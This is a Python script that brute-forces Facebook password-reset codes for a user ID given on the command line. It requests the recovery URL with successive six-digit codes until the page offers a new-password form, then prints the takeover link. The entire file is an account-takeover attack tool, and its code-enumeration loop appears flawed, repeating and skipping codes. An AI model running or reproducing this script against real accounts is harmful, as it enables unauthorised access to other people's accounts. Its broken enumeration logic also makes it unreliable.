#! /usr/bin/python3.11

import requests
import sys

i = 0

array = [0,0,0,0,0,0]
chars = "0123456789"
password = "000000"
user_id = sys.argv[1]

for i in range(1000000):
    x = requests.get(f'https://www.facebook.com/recover/password/?u={user_id}&n={password}')
    if 'password_new' in x.text:
        print(f'connect to https://www.facebook.com/recover/password/?u={user_id}&n={password}')
        sys.exit()
    password = ""

    i+=1
    if i % 10000 == 0:
        print(i / 10000)

    for j in range(6):
        password += chars[array[j]]

    for j in range(6):
        array[j] += 1
        if array[j] >= 10:
            array[j] = 0
            break
